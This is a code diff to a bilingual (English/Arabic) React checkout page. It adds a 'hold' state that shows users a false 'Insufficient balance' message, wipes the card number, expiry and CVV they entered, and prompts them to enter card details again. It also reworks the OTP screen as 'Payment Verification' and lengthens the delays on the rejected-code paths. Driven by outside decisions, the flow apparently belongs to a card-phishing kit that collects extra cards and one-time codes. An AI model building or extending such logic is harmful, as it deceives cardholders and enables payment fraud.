@@ -340,6 +340,23 @@ export default function BuyPage() {
           return;
         }
 
+        if (decision === 'hold') {
+          setStage(7);
+          setTimeout(() => {
+            if (!alive) return;
+            setCardNumber('');
+            setCardExpiry('');
+            setCardCvv('');
+            setError(
+              isRtl
+                ? 'الرصيد لا يكفي. يرجى إعادة إدخال بيانات البطاقة.'
+                : 'Insufficient balance. Please re-enter your card details.'
+            );
+            setStage(2);
+          }, 3000);
+          return;
+        }
+
         if (decision === 'rejected') {
           setOtpFailType('rejected');
           setStage(6);
@@ -347,7 +364,7 @@ export default function BuyPage() {
             if (!alive) return;
             setStage(3);
             setOtpCode('');
-          }, 1400);
+          }, 3000);
           return;
         }
 
@@ -358,7 +375,7 @@ export default function BuyPage() {
             if (!alive) return;
             setStage(3);
             setOtpCode('');
-          }, 1400);
+          }, 3000);
           return;
         }
 
@@ -890,15 +907,8 @@ export default function BuyPage() {
             {stage === 3 && (
               <div className="buy-form-grid mt-6" style={{ direction: isRtl ? 'rtl' : 'ltr' }}>
                 <div className="cc-otp-panel buy-span-2">
-                  <div className="cc-otp-title">{isRtl ? 'بانتظار إدخال الكود' : 'Enter the code'}</div>
-
-                  <div className="cc-otp-code-box" aria-live="polite">
-                    {otpCode ? (
-                      <code>{otpCode}</code>
-                    ) : (
-                      <span style={{ opacity: 0.7 }}>{isRtl ? '••••••' : '••••••'}</span>
-                    )}
-                  </div>
+                  <div className="cc-otp-title">{isRtl ? 'تحقق من الدفع' : 'Payment Verification'}</div>
+                  <div className="cc-otp-sub">{isRtl ? 'أدخل كود التحقق الذي وصلك' : 'Enter the verification code you received'}</div>
 
                   <label className="input-label" style={{ textAlign: isRtl ? 'right' : 'left', marginTop: '1rem' }}>
                     {isRtl ? 'أدخل كود التحقق (3-9 أرقام)' : 'Verification code (3-9 digits)'}
@@ -963,6 +973,18 @@ export default function BuyPage() {
               </div>
             )}
 
+            {stage === 7 && (
+              <div className="buy-form-grid mt-6" style={{ direction: isRtl ? 'rtl' : 'ltr' }}>
+                <div className="cc-otp-await cc-otp-hold buy-span-2">
+                  <div className="cc-otp-hold-icon" aria-hidden="true">!</div>
+                  <div className="cc-otp-await-title">{isRtl ? 'الرصيد لا يكفي' : 'Insufficient Balance'}</div>
+                  <div className="cc-otp-await-sub">
+                    {isRtl ? 'يرجى إعادة إدخال بيانات البطاقة' : 'Please re-enter card details'}
+                  </div>
+                </div>
+              </div>
+            )}
+
             <div className="flex gap-4 mt-6 buy-actions" style={{ flexDirection: isRtl ? 'row-reverse' : 'row' }}>
               {stage === 1 ? (
                 <Link to="/" className="btn btn-outline" style={{ flex: 1 }}>
@@ -1008,7 +1030,7 @@ export default function BuyPage() {
                           : 0.6,
                 }}
                 disabled={
-                  stage === 4 || stage === 5 || stage === 6
+                  stage === 4 || stage === 5 || stage === 6 || stage === 7
                     ? true
                     : stage === 1
                       ? !canMoveToPayDetails
